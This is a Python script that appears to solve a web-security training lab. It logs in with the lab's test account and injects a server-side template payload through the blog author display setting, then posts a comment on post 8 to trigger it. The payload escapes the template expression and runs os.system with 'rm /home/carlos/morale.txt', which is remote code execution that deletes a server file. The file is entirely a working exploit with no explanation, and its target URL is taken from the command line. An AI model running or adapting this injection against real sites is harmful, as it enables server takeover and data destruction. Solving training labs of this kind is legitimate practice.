import requests
import re
import sys

def get_csrf_token(response_text):
    return re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response_text).group(1)

def main(base_url):
    session = requests.Session()
    
    response = session.get(base_url)
    csrf_token = get_csrf_token(response.text)
    
    login_data = {
        'csrf': csrf_token,
        'username': 'wiener',
        'password': 'peter'
    }
    session.post(base_url, data=login_data)

    response = session.get(sec_url)
    csrf_token = get_csrf_token(response.text)

    payload_data = {
        'blog-post-author-display': 'user.name}}{% import os %}{{os.system("rm /home/carlos/morale.txt")}}',
        'csrf': csrf_token
    }
    session.post(last_url, data=payload_data)

    response = session.get(coment_1)
    csrf_token = get_csrf_token(response.text)
    
    comment_data = {
        'csrf': csrf_token,
        'postId': 8,
        'comment': '1111'
    }
    response = session.post(coment_2, data=comment_data)
    response = session.get(coment_1)

if __name__ == "__main__":
    base_url = sys.argv[1] + '/login'
    sec_url = sys.argv[1] + '/my-account'
    last_url = sys.argv[1] + '/my-account/change-blog-post-author-display'
    coment_1 = sys.argv[1] + '/post?postId=8'
    coment_2 = sys.argv[1] + '/post/comment'

    main(base_url)

